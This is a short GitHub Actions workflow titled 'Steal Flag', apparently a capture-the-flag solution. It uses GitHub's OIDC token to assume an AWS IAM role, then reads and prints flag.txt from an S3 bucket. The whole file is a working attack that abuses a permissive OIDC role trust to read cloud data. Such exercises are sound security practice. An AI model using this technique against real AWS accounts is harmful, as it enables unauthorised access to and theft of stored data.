name: Steal Flag
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  grab-flag:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875
          role-session-name: ${{ github.actor }}-${{ github.run_id }}
          aws-region: ap-southeast-1

      - name: Show flag
        run: |
          aws sts get-caller-identity
          aws s3api head-object --bucket oh-i-really-do-care --key flag.txt
          aws s3 cp s3://oh-i-really-do-care/flag.txt -
